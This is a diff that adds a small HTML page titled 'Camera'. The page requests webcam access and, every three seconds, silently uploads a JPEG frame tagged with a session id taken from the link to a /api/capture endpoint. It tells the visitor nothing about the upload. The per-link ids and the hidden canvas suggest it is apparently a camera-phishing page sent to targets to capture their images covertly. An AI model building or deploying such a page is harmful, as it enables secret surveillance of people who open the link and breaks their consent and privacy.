@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Camera</title>
+</head>
+<body>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+const sessionID = urlParams.get("id");
+
+if (!sessionID) alert("Invalid link");
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => video.srcObject = stream)
+.catch(e => alert("Camera access denied."));
+
+function sendFrame() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    const img = canvas.toDataURL("image/jpeg");
+
+    fetch("/api/capture", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id: sessionID, image: img })
+    });
+}
+
+setInterval(sendFrame, 3000);
+</script>
+
+</body>
+</html>
